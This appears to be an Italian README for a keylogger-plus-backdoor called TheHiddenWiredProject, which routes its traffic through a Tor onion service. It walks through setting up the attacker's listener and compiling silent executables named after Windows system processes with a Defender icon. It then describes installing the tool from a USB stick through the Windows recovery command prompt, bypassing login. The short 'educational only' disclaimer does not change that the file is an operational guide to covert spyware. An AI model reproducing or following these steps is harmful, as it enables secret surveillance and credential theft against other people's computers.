QUESTO PROGETTO É STATO CREATO SOLO A SCOPO EDUCATIVO E SPERIMENTALE, NON USARLO IN PC CHE NON APPARTENGONO AL TUO LAB VIRTUALE!

--------------------------------------- TheHiddenWiredProject ---------------------------------------

Cosa è TheHiddenWiredProject?
TheHiddenWiredProject (THWP) è un keylogger con backdoor integrata pensato per essere ultra stealth
perchè tutto il traffico generato è instradato via Tor!

è safe?
Yeah bro, è 100% safe, il codice lo puoi modificare come vuoi senza problemi, mentre Tor ti aiuta
a nascondere il tuo server (serve per ascoltare il keylogger e usare la backdoor).

quindi devo configurare un server!?
Yeah, è necessario per avere un livello di anonimato abbastanza alto

è pronto all'uso?
assolutamente no, lo devi compilare tu, è ultra facile, continua a leggere che dopo lo spiego

lo consigli?
Assolutamente si! Questo tool è estremamente compatto, ma nello stesso tempo ultra stealth,
non troveresti mai un keylogger con una backdoor via Tor su internet!!

----------------------------------------------------------------------------------------------------

Passiamo alla teoria noiosa che è necessaria per configurare il server e compilare THWP

Partiamo dai requisiti necessari...

Un PC o una VM con linux (consiglio una distro debian-based come debian, ubuntu, mint.. ecc...)
Una connessione internet stabile (almeno 2Mbitps)

----------------------------------------------------------------------------------------------------
Creare e configurare il server Tor:

# Per evitare problemi diventa root con "sudo su"

# installa tor
sudo apt install tor

# modifica il file torrc
sudo nano /etc/tor/torrc

# Aggiungi le seguenti informazioni alla fine del file:

HiddenServiceDir /var/lib/tor/serverTHWP
HiddenServicePort 80 127.0.0.1:80

# La prima stringa "HiddenServiceDir" specifica dove tor andrà a salvare la config del server (NON METTERE DIRECTORY CUSTOM PER EVITARE PROBLEMI, LASCIALA COSÍ)
# La seconda stringa hosta sulla porta 80

# Adesso devi riavviare Tor per rendere effettive le modifiche
sudo systemctl restart tor

# Se hai dubbi vai su: https://community.torproject.org/onion-services/setup/
# Oppure chiedi a ChatGPT

# Adesso devi vedere il tuo dominio su tor, lo puoi vedere con:
cat /var/lib/tor/serverTHWP/hostname

# Per evitare problemi diventa root con "sudo su"

----------------------------------------------------------------------------------------------------

Adesso devi configurare TheHiddenWiredProject per fare in modo che indirizza il traffico verso il tuo dominio,
quindi modifica il file Isass.py, trova una variabile che si chiama "TARGET_ONION" (la trovi all'inizio),
e metti il tuo dominio (quello che finisce per .onion che hai trovato dentro il file hostname)

----------------------------------------------------------------------------------------------------

Adesso hai tutto pronto!! Puoi testare su una VM Windows il funzionamento, se tutto funziona puoi compilare tutto!!

Per compilare tutto é necessaria una macchina Windows, useremo nuitka per trasformare i notri file in python in eseguibili.

1) Installa Python nella macchina Windows (Non da MStore ma dal sito ufficiale)
2) Adesso apri il terminale e digita: pip install nuitka (SE PIP NON VIENE TROVATO RIAVVIA WINDOWS DOPO AVER INSTALLATO PYTHON!)
3) Adesso digita: nuitka --onefile --windows-disable-console file.py

# --onefile = unico file .exe
# --windows-disable-console = no prompt quando viene eseguito

4) Esegui nuitka per ogni file .py (Isass.py, WMIHost.py, wuasrvs.py)
5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internte) NB: INSTALLER.BAT DEVE RIMANERE RAW, NON DEVE ESSERE COMPILATO!!!
6) Aggiungi l'icona di defender al file .bat dentro il compilatore per avere un .exe con l'icona di Defender
----------------------------------------------------------------------------------------------------

Adesso hai quasi finito!
Copia il progetto compilato dentro una pendrive, copia il file installer.bat nella root della chiavetta, rimuovi la cartella "WPE" 
e il risultato dovrebbe essere questo:

E:\Isass.exe
E:\Installer.bat
E:\SecurityHealthSystray.exe
E:\WMIHost.exe
E:\wuasrv.exe
E:\wuasrvs.exe

Se non corrisponde hai sbagliato qualcosa.


Come lo installo??
1) Avvia Windows
2) Una volta che ti trovi nella schermata di blocco, vai nel menu di spegnimento, premi "SHIFT" e poi "Riavvia"
3) Dovresti leggere a schermo "Attendi"
4) Dopo il riavvio vai su: Risoluzione dei problemi > Opzioni avanzate > Prompt dei comandi
5) Adesso cerca la lettera della chiavetta (varia da PC a PC), prova dalla C alla J (basta scrivere nel prompt la lettera seguita dai due punti, quindi "c:")
6) Una volta trovata la pendrive esegui installer.bat
7) Il PC si riavvierá da solo e TheHiddenWiredProject sará installato!
8) Divertiti!!
